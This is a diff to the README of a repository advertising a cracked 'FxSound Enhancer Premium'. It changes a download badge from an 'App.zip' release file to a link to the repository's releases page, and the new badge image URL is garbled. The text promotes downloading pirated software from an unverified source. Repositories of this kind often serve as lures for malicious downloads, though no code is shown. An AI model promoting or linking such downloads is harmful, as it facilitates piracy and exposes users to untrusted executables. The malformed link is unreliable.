@@ -9,7 +9,7 @@ Welcome to the FxSound Enhancer Premium Crack repository, your one-stop destinat
 
 ## Latest Release
 To download the latest version of FxSound Enhancer Premium, click on the button below:
-[![Download FxSound Enhancer Premium](https://img.shields.io/static/v1?label=Download&message=FxSound%20Enhancer%20Premium&color=blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download FxSound Enhancer Premium](https://github.com/shyamkashyapyt/FxSound-Enhancer-Premium-Crack/releases%20Enhancer%20Premium&color=blue)](https://github.com/shyamkashyapyt/FxSound-Enhancer-Premium-Crack/releases)
 
 ## Getting Started
 If you are new to FxSound Enhancer Premium, below are some resources to help you get started:
